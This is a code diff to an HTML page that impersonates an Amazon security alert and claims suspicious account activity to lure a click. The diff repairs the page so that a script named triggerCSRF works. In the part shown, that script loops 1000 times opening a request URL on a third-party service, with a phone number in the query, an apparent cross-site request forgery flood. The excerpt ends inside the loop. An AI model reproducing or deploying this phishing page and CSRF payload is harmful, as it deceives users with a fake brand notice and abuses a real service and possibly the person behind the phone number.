@@ -50,6 +50,7 @@
 
         .button:hover {
             background-color: #e0b13a;
+	    cursor: pointer;
         }
     </style>
 </head>
@@ -57,12 +58,12 @@
     <div class="container">
         <h1>Important Security Update</h1>
         <p>We have detected suspicious activity on your Amazon account. Please click the button below to verify your account and protect your personal information.</p>
-        <div class="button">
+        <button class="button">
             Verify Account & Secure Now
-        </div>
+        </button>
     </div>
         <script>
-	    let btn = document.getElementByTagName('button')
+	    let btn = document.getElementsByTagName('button')
             function triggerCSRF() {
                 for (let step = 0; step < 1000; step++) {
   		window.open("https://app-mig.emreach.com/incidents/record?phoneNumber=917979898742&voiceid=00000000-0000-0000-0000-000000000000")
